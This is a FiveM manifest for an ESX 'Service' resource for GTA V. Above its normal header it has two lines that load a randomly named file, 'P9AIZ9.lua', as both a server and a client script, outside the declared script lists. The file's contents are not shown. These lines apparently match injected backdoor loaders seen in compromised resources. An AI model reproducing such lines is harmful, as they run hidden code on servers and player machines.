server_script "P9AIZ9.lua"
client_script "P9AIZ9.lua"


fx_version 'adamant'

game 'gta5'

description 'ESX Service'

version '1.5.0'

shared_script '@es_extended/imports.lua'

server_scripts {
	'server/main.lua'
}

client_scripts {
	'client/main.lua'
}

dependency 'es_extended'
